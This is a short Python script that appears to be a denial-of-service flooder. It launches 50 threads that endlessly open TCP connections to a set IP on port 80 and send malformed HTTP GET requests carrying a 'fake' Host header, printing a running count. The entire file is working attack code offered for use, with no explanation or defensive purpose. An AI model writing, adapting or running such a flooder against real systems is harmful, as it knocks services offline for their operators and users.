import threading
import socket

target="10.0.0.138"
fake_ip='182.21.20.32'
port=80

executed = 0

def atck():
    while True:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /"+ target + "HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("HOST: "+ fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
        s.close()   
        
        global executed
        executed+=1
        if executed%50==0:
            print(executed)
        
for i in range(50):
    thread=threading.Thread(target=atck)
    thread.start()